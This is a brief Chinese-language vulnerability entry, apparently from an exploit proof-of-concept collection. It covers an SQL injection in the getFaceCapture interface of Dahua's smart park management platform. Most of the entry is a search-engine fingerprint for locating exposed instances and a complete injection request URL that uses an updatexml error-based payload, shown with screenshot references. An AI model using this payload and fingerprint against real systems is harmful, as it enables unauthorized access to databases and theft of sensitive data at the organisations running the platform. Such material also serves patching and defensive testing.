# 大华 智慧园区综合管理平台 getFaceCapture SQL注入漏洞

## 漏洞描述

大华 智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息

## 漏洞影响

智慧园区综合管理平台

## 网络测绘

```
app="dahua-智慧园区综合管理平台"
```

## 漏洞复现

![image-20230828144644472](images/image-20230828144644472.png)

请求POC

```
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
```

![image-20230828145938818](images/image-20230828145938818.png)